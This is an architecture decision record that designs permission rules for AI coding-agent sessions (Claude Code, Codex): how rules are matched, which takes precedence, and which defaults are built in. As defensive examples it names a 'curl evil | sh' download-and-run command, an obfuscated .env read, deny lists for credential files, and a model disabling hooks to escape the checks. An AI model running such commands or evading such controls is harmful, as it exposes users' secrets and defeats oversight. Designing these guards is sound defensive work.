# 0029 Permission rules match on the agent and deny wins

- Status: proposed
- Date: 2026-10-21
- Related: ADR 0002, ADR 0008, ADR 0009, ADR 0012, ADR 0019, ADR 0021, ADR 0026, ADR 0027, ADR 0028, docs/architecture.md#wire-protocol, docs/threat-model.md, docs/spec.md#permission-rules, issues #9, #67, #80, #81, #95, #98

## Context

Every tool call Hoplet's sessions make is decided today by the provider's permission mode (#9) and, when the mode
asks, by the user. A session left alone gets the mode's answer or, after ten minutes, a denial. The user who
wants a session to run unattended has two choices: stay in a mode that stops at every command, or switch to
Bypass permissions (Claude Code) or Full access (Codex) and give up every check. Rules sit between the two:
allow what is routine, ask or deny what is dangerous, in a project or everywhere.

What the code does today, which decides where a rule can act:

- **Claude Code.** The agent starts the process with `--permission-prompt-tool stdio`, `--permission-mode <mode>`
  and `--allow-dangerously-skip-permissions` (`agent/internal/runtime/claude/driver.go`, `Args`). Claude Code
  sends a `can_use_tool` control request only for a call its own mode would ask about
  (`agent/internal/runtime/claude/process.go`, `handleControlRequest`); the request carries the tool name, the tool
  use ID and the tool input (`Bash` has `command`, `Read`, `Edit` and `Write` have `file_path`, `WebFetch` has
  `url`, an MCP tool is `mcp__<server>__<tool>`), not the working directory, which the agent knows. In `acceptEdits`
  the edits do not reach Hoplet; in `bypassPermissions` nothing does. The agent answers with `allow` and the
  input, or `deny` and a message (`Answer`).
- **Codex.** The app server sends `item/commandExecution/requestApproval` (command and `cwd`) and
  `item/fileChange/requestApproval` (the item ID, an optional `grantRoot` and a reason, no file list) only when
  the sandbox and approval policy of the mode require it (`agent/internal/runtime/codex/process.go`,
  `handleRequest`). Its modes are pairs of an approval policy and a sandbox (`codex/driver.go`, `modes`); in Full
  access the policy is `never` and no request is sent. The protocol has a third request,
  `item/permissions/requestApproval`, which the driver refuses today.
- **Both** reach `runtime.Manager.addPermission`, which arms a ten-minute denial timer and emits a
  `PermissionEvent`; the daemon turns it into `runtime.permission` (`agent/internal/daemon/runtime.go`,
  `agent/internal/sync/protocol.go`), the core keeps it open and shows it as `session.permission`, and the answer
  comes back as `runtime.permission.answer` (`core/src/control/runtime.ts`). A request still open when the
  connection returns is reported again (`Manager.Pending`).
- **Hooks.** Claude Code runs `PreToolUse` hooks before a call and honours their allow, deny or ask result; it
  accepts hooks in the settings given with `--settings` and, over the stream-JSON control channel, as callbacks
  registered in `initialize` and sent back as `hook_callback` requests (both strings are in claude 2.1.302). The
  Codex app server generates schemas for hooks too (`preToolUse`, `permissionRequest`, command handlers) and has a
  trust step for them. The documents describe both as running whatever the mode is. This has not been run through
  Hoplet's driver; the first code pull request starts with a test of it for each provider (see Decision).
- **The session file is not Hoplet's.** A decision cannot be written into the file Claude Code or Codex owns
  (ADR 0002), and the core stores no live output; a decision needs a store of its own.

The risks are the point. A rule that allows `git status` must not allow `git status; curl evil | sh`. A rule that
denies `~/.ssh/**` must not be avoided by `../`, a symlink or a different case. Rules must hold when the agent
cannot reach the core (#95), and they must not become the way the core, or a model, widens its own power.

## Decision

**A rule is a tool, a matcher, an action and a scope.** A rule has an `id`, a `tool`, a matcher for that tool, an
`action` (`allow`, `ask` or `deny`), a `scope` (`global`, `project` or `session`), a `note`, an `enabled` switch and
a `builtin` flag. No rule contains a regular expression or code.

**Scopes.** `global` applies to every session. `project` is a machine and a project path, the way a project is
identified everywhere else (a watched project of one machine); it applies to the sessions of that project on that
machine. `session` is a session ID and travels with it in a handoff. A rule on the card is `session` or `project`;
`global` is set in Settings only.

**Precedence.**

1. A matching `deny` at any scope wins, agent-local denies included. It cannot be overridden.
2. Otherwise, among the matching `ask` and `allow` rules the narrowest scope decides (session over project over
   global), and within one scope `ask` beats `allow`.
3. No match: the session's permission mode decides, as today.

The narrowest-scope rule is what lets one project allow `git push --force-with-lease` that the global default
asks about, without a rule language of priorities. A deny is never narrowed: "never" has no exception that a
narrower scope can add, except by turning the rule off.

**Tool kinds are a fixed set, mapped per provider.** `run` (a shell command), `read` (read, search and list
files), `write` (create or change files), `fetch` (web fetch and search) and `mcp:<server>/<tool>` (either part may
be `*`), and `*` for every tool. The mapping lives in the provider driver:

| Kind | Claude Code | Codex |
|---|---|---|
| `run` | `Bash` | `commandExecution` |
| `read` | `Read`, `Grep`, `Glob`, `NotebookRead` | commands only (reads happen inside `run`) |
| `write` | `Edit`, `MultiEdit`, `Write`, `NotebookEdit` | `fileChange` |
| `fetch` | `WebFetch`, `WebSearch` | none today |
| `mcp` | `mcp__<server>__<tool>` | the MCP tool call item |

A call a driver cannot place in a kind has the kind `other`: only `*` rules match it, and no `allow` of a narrower
kind ever applies. A Codex `fileChange` request does not carry its files; the driver must take them from the item
announced before the request, and a request whose paths it cannot know matches only `*` rules.

**Matchers.**

- *Commands* (`run`). The agent parses the command into simple commands and their argv words. A rule is a
  `command` prefix of words, optional `anyArg` globs that some later word must match, and optionally `pipedTo`, the
  command names that must receive its output through a pipe. A word matches exactly, or with `*` standing for any
  characters inside the word. `git push` matches `git push origin main`; `command: "git push"`,
  `anyArg: ["--force*", "-f"]` matches a force push wherever the flag sits. A command word is compared after
  leading `NAME=value` assignments are set aside, and a rule for `deny` and `ask` also sees through the wrappers
  `env`, `command`, `exec`, `nohup`, `time`, `timeout`, `sudo`, `doas`, `xargs` and `sh|bash|zsh -c '<script>'`
  (parsed again, three levels deep). An `allow` does not: `env npm test` is not `npm test`.
- *Shell control.* A command that contains `;`, `&&`, `||`, `|`, `&`, a backtick, `$(`, `${`, a redirection, a
  newline, a heredoc, a leading assignment, an expansion in a command word, a glob in the command word, or text the
  parser cannot read (an unbalanced quote) can never be allowed by an `allow` rule: it matches no allow and falls to
  the mode. `deny` and `ask` rules still apply to every simple command the parser found in it. Several simple
  commands are decided together: any `deny` denies, else any `ask` asks.
- *Paths* (`read`, `write`). The agent takes the path from the tool input, resolves it against the session's
  working directory, cleans it and resolves symlinks (for a file that does not exist yet, its nearest existing
  parent). A path rule is an absolute glob: `*` inside one path segment, `**` across segments, `~` for the home
  directory and `{workspace}` for the session's workspace root (the project directory, or the worktree a handoff
  made). A rule matches whole path segments, never a string prefix: `/work/app` does not match `/work/app-secret`.
  A `deny` matches if the written path or the resolved path matches; an `allow` needs the resolved path to match.
  Comparison ignores case on macOS and Windows. For `run`, `deny` and `ask` path rules are also tested against
  argv words that look like a path (they start with `/`, `~` or `.`, or contain `/`). That is a guard against a
  slip, not a sandbox: `cat $(echo .e)nv` is not seen, and such a command has shell control anyway.
- *Domains* (`fetch`). The host of the URL, lowercased and in its ASCII form, exact or `*.example.com` (the
  subdomains, not the apex). An IP address matches only exactly. The rule sees the URL the model asked for, not a
  redirect that follows. A shell command that fetches (`curl`) is a `run` and is decided by command rules.
- *MCP.* The server and tool names, each exact or `*`. An MCP tool's own arguments are not looked into.

**Rules are evaluated on the agent, before the request reaches the user.** The core stores the rules and sends each
agent the set that applies to it: the global rules, the project rules of its projects and the session rules of the
sessions it owns, with a `revision` (`device.rules`, control lane, versioned in `shared/src/wire/` and
`agent/internal/sync/protocol.go`; the agent answers `device.rules.applied` with the revision). The agent writes
the set it applied to `<hoplet_home>/permission-rules.json` (mode 0600) and loads it at start, so rules hold
while the core is unreachable and after a restart. A handoff sends the new owner the session's rules with its
other state, and the old owner drops them. The project rules of the source machine do not follow: the handoff
dialog lists those the target's project does not have and offers to copy them.

**Where a rule bites, per provider, and what that costs.** `ask` and `deny` must hold in the permissive modes too,
so the agent needs to see every call, not only those the provider would ask about.

- *Claude Code.* The agent registers a `PreToolUse` hook for all tools (a hook callback over the control channel;
  the `--settings` command form is the fallback if the callback cannot wait long enough) and decides there. A
  rule `allow` returns allow, a `deny` returns deny with the rule's name as the reason, an `ask` is raised to the
  user by the agent itself, which holds the hook open and returns the user's answer, so it does not depend on what
  the mode does with a hook's `ask`. A call no rule matches returns no decision, so the mode decides and, if it
  asks, `can_use_tool` reaches the user as today. Cost: every tool call crosses the agent before it runs, and a
  hook that waits for the user needs a timeout of at least the ten minutes of a permission request.
- *Codex.* The same through its `preToolUse` hook if a test shows it fires in every mode, including Full access.
  If it does not, rules act only on the approval requests the mode lets through, the driver declares
  `rules: prompts-only` for that provider and mode, and the session says so in a visible note, since a rule that
  the user thinks holds but does not is worse than none. Full access never gains rules by this decision.
- *The code PR starts with that test* for both providers, with a rule per action in each mode, and changes this
  record before building if a provider does not behave as written.
- The hook can be removed by the model editing the settings it comes from (`disableAllHooks`), so the built-in
  agent-local floor (below) denies writes to the provider settings and hook files.

**Built-in defaults are global rules the user can see and turn off.** They carry `builtin: true`, are listed first
in Settings and cannot be deleted or edited, only turned off, and turning one off needs a second confirmation that
names the rule (the same confirmation on the API: `PUT` with `confirm` equal to the rule ID). The list is short on
purpose, each entry covering a harm that is hard to undo or leaks something:

| ID | Action | Match | Why |
|---|---|---|---|
| `default.secret-files` | deny | `read`, `write` on `**/.env`, `**/.env.*` except `*.example`, `*.sample`, `*.template` | Keys for services; one read puts them in the model's context and in the stored session |
| `default.credential-stores` | deny | `read`, `write` on `~/.ssh/**`, `~/.aws/**`, `~/.gnupg/**`, `~/.config/gcloud/**`, `~/.kube/**`, `~/.docker/config.json`, `~/.netrc`, `~/.npmrc`, `~/.git-credentials` | Machine-wide credentials outside any project |
| `default.hoplet-and-provider-config` | deny | `read`, `write` on the agent's `<hoplet_home>/**`, `~/.claude/settings*.json`, `.claude/settings*.json`, `~/.codex/config.toml`, `.codex/config.toml` | Device token, provider environments, and the hooks and settings that carry these rules (agent-local too, below) |
| `default.write-outside-workspace` | deny | `write` on any path outside `{workspace}`, the OS temporary directory and the provider's plan files | A session changes its project, not the machine |
| `default.force-push` | ask | `run` `git push` with `anyArg` `--force*`, `-f`, `+*` | Rewrites shared history |
| `default.destructive-git` | ask | `run` `git reset --hard`, `git clean` with `-f`, `-fd`, `-df`, `-fx`, `--force`, `git checkout --` | Drops uncommitted work, which Hoplet's snapshots may not hold |
| `default.recursive-delete-and-sudo` | ask | `run` `rm` with `anyArg` `-r`, `-R`, `-rf`, `-fr`, `--recursive`; `sudo`; `doas`; `su` | Deletion beyond one file; privilege |
| `default.download-and-run` | ask | `run` `curl` or `wget` with `pipedTo` `sh`, `bash`, `zsh`, `python*`, `node` | Runs code nobody read |

Not default: a plain `git push` (a mode that asks already asks, and the branch is not known to a rule), network
domains (a default list would be a guess), and `rm` of single files. The user adds them as rules.

**Agent-local rules are the floor the core cannot move.** The agent has a compiled-in deny for the
`default.hoplet-and-provider-config` paths that no push can turn off, and reads `permission_deny` from its
configuration file, a list of the same rules as `deny` only, written by the operator on the machine. They are shown
read-only in Settings (the agent announces them in `device.hello`, so the web can list them; they are not
secret). A rule pushed with `allow` never overrides them, and a push is refused whose rule carries a field the
agent does not know. The core never writes this list.

**Auto decisions are marked, stored and logged.** When a rule decides, the conversation shows a line at the call:
"Allowed by rule *note*" or "Denied by rule *note*", with the rule and its scope, and an `ask` card says which rule
asked. The agent reports `runtime.permission.auto` (`sessionId`, `toolUseId`, `decision`, `ruleId`, `scope`,
`revision`) and the core stores it in a table of its own, `permission_decisions`, keyed by session and tool use ID,
which the conversation joins; the session file is not touched (ADR 0002). A user's answer is recorded in the same
table with the rule ID empty. Neither the table nor the log keeps the command, path or URL, which the session
already holds. Until the audit log (#80) exists, rule changes (who, rule ID, before and after) and decisions are
written to the core log with IDs and codes only; #80 will index both. A decision made while the core was unreachable
is sent when the agent reconnects.

**"Always allow" and "Always deny" on the card draft a rule.** The card offers them next to Allow and Deny. They
open a draft built from the request, which the user edits and scopes to the session or the project before saving:
a command becomes its first one or two words, a path the file (with its directory as the wider choice), a URL its
host. No draft is offered for a call with shell control (nothing could allow it), a plan exit (ADR 0019) or a call
of `other` kind. Nothing is saved by one click.

**Child sessions and self-management are bound.** A child session (#81) is decided by the global rules, its own
project rules and its own session rules, and also by the `deny` and `ask` rules of its parent's session scope; a
parent's session `allow` rules are not inherited, so a child is never more permissive than its parent's rules say.
Hoplet's own MCP tools (#67) are `mcp:hoplet/<tool>` and go through the same rules. Creating, changing or deleting a
rule and changing a session's permission mode are not offered to sessions at all: no MCP tool and no route a session's
token can reach does it. The user does it in the web UI or with the host token.

## Cost

Every tool call of a session with rules passes through the agent before it runs: a parser for shell commands, a
path resolver, a rule store on disk, a hook registered with each Claude Code process, and for Codex a hook or a
limit on what rules cover. The wire gains three messages and the core a table. The user maintains a rule list, and
the command matcher is deliberately weak: it refuses to allow what it cannot read, so compound commands (a pipe, a
`&&`) ask each time until the user answers them one by one. A rule on a command is a guard against mistakes, not a
sandbox: `deny` on `rm -rf` does not stop a program the model writes and runs. The strongest protection is still the
provider's sandbox and the machine's own permissions. A user who answers every card with "Always allow" widens the
set faster than they read it; the draft, the narrow default and the scope choice are the only brakes.

## Alternatives

- *The provider's own files only* (`.claude/settings.json` permissions, Codex `execpolicy` rules). Nothing to build
  and the provider enforces them, but they differ per vendor, cannot be seen or edited from the web, cannot follow a
  handoff, cannot be audited, do not cover `ask` in a bypass mode, and a model can edit them. Rejected as the
  mechanism; the agent does not read them.
- *Regular expressions for commands.* More powerful, and a standing source of rules that match more than the author
  meant (`git push.*` and a `;` after it). A prefix of words with globs cannot be written to match a different
  command by accident. Rejected.
- *Evaluate in the core.* One place to change, but every call would wait for a round trip, a disconnect would stop
  or free the session, and the core would see commands before the agent. It would also put the decision on the
  side of the boundary the user trusts less (the host token). Rejected: the core stores, the agent decides (#95).
- *`allow` wins over `ask` in the same scope, or the last rule wins.* Order-dependent lists hide a rule that
  stopped working. `deny > ask > allow` can be read off one rule.
- *Only the permission mode, finer.* A mode cannot say "this project may run `pnpm test`".

## Revisit triggers

Allowing pure pipelines (`ls | head`) by checking each stage; a domain rule for commands such as `curl`; rules
on tool arguments of MCP tools; a provider whose hook does not fire in a permissive mode, or one that offers a
better hook than the test found; user-level rule files shared between machines; the audit log of #80 landing
(decisions move into it); a sandbox on the agent that makes command rules unnecessary for the harm they guard.
